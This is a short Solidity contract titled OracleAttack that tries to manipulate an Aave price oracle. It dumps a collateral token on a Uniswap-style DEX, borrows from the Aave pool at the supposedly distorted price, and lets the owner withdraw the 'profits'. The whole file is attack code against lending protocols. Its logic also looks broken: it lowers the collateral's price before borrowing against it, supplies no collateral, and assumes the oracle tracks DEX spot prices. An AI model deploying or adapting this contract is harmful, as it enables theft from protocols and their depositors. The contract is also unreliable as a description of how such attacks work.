// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Real Aave & Uniswap/Sushiswap interfaces
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IPriceOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

contract OracleAttack is Ownable {
    IPool public lendingPool;
    IPriceOracle public aaveOracle;
    IUniswapV2Router02 public dexRouter;

    address public collateralToken; // e.g., YFI, WBTC
    address public debtToken;       // e.g., USDC, DAI

    constructor(
        address _lendingPool,
        address _aaveOracle,
        address _dexRouter,
        address _collateralToken,
        address _debtToken
    ) {
        lendingPool = IPool(_lendingPool);
        aaveOracle = IPriceOracle(_aaveOracle);
        dexRouter = IUniswapV2Router02(_dexRouter);
        collateralToken = _collateralToken;
        debtToken = _debtToken;
    }

    function manipulatePriceAndBorrow(uint256 amountIn, uint256 amountToBorrow, address[] calldata path) external onlyOwner {
        // Approve DEX
        IERC20(collateralToken).approve(address(dexRouter), amountIn);

        // Dump collateral token to drop price
        dexRouter.swapExactTokensForTokens(
            amountIn,
            0, // Accept any output
            path, // [collateralToken, USDC]
            address(this),
            block.timestamp + 60
        );

        // Wait a few blocks off-chain to allow Aave oracle to update (if using TWAP/fallback)

        // Then borrow from Aave at manipulated price
        lendingPool.borrow(
            debtToken,
            amountToBorrow,
            2, // Variable interest rate
            0,
            address(this)
        );
    }

    function withdrawProfits(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, "No profits");
        IERC20(token).transfer(msg.sender, balance);
    }

    receive() external payable {}
}